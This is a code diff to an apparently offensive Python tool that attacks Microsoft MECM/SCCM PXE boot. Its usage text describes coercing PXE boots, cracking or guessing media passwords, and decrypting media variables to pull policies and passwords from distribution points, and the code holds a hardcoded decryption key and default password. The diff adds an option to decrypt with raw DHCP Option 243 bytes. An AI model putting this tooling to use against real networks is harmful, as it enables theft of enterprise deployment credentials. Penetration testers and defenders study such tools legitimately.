@@ -494,12 +494,13 @@ def process_full_media(password, policy):
     process_task_sequence_xml(wf_decrypted_ts)
     process_naa_xml(wf_decrypted_ts)
 
-def use_encrypted_key(encrypted_key, media_file_path):
+def use_encrypted_key(encrypted_key=None, media_file_path=None, encrypted_bytes=None):
 
-    #ProxyDHCP Option 243
-    length = encrypted_key[0]
-    encrypted_bytes = encrypted_key[1:1+length] # pull out 48 bytes that relate to the encrypted bytes in the DHCP response
-    encrypted_bytes = encrypted_bytes[20:-12] # isolate encrypted data bytes
+    if encrypted_bytes == None:
+        #ProxyDHCP Option 243
+        length = encrypted_key[0]
+        encrypted_bytes = encrypted_key[1:1+length] # pull out 48 bytes that relate to the encrypted bytes in the DHCP response
+        encrypted_bytes = encrypted_bytes[20:-12] # isolate encrypted data bytes
 
     key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9' #Harcoded in tspxe.dll
 
@@ -893,11 +894,11 @@ if __name__ == "__main__":
 """
     print(name)
 
-    if len(sys.argv) < 2 or sys.argv[1] == "-h":
+    if len(sys.argv) < 2 or sys.argv[1] == "-h" or sys.argv[1] == "--help":
 
         print("%s 1 - Automatically identify and download encrypted media file using DHCP PXE boot request. Additionally, attempt exploitation of blank media password when auto_exploit_blank_password is set to 1" % sys.argv[0])
         print("%s 2 <IP Address of DP Server> - Coerce PXE Boot against a specific MECM Distribution Point server designated by IP address" % sys.argv[0])
-        print("%s 3 <variables-file-name> <Password-guess> - Attempt to decrypt a saved media variables file and retrieve sensitive data from MECM DP" % sys.argv[0])
+        print("%s 3 <variables-file-name> <Password-guess> (-k) - Attempt to decrypt a saved media variables file and retrieve sensitive data from MECM DP (-k) for DHCP bytes" % sys.argv[0])
         print("%s 4 <variables-file-name> <policy-file-path> <password> - Attempt to decrypt a saved media variables file and Task Sequence XML file retrieved from a full TS media" % sys.argv[0])
         print("%s 5 <variables-file-name> - Print the hash corresponding to a specified media variables file for cracking in hashcat" % sys.argv[0])
         print("%s 6 <identityguid> <identitycert-file-name> - Retrieve task sequences using the values obtained from registry keys on a DP" % sys.argv[0])
@@ -929,8 +930,8 @@ if __name__ == "__main__":
         #Decrypt media variables file using password
         print("[+] Attempting to decrypt media variables file and retrieve policies and passwords from MECM Server...")
 
-        if not (len(sys.argv) == 4 or len(sys.argv) == 3): 
-            print("Usage:   %s 3 <variables-file-name> <Password-guess>" % sys.argv[0])
+        if not (len(sys.argv) == 4 or len(sys.argv) == 3 or len(sys.argv) == 5):
+            print("Usage:   %s 3 <variables-file-name> <Password-guess> (-k)" % sys.argv[0])
             sys.exit(0)
         
         if len(sys.argv) == 3:
@@ -938,6 +939,9 @@ if __name__ == "__main__":
             password = "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}"
         else:
             password = sys.argv[3]
+        if (len(sys.argv) == 5) and (sys.argv[4] == "-k"):
+            use_encrypted_key(None, sys.argv[2], binascii.unhexlify(sys.argv[3].replace(" ", "")))
+            sys.exit(0)
 
         path = sys.argv[2]
         media_variables = decrypt_media_file(path,password)
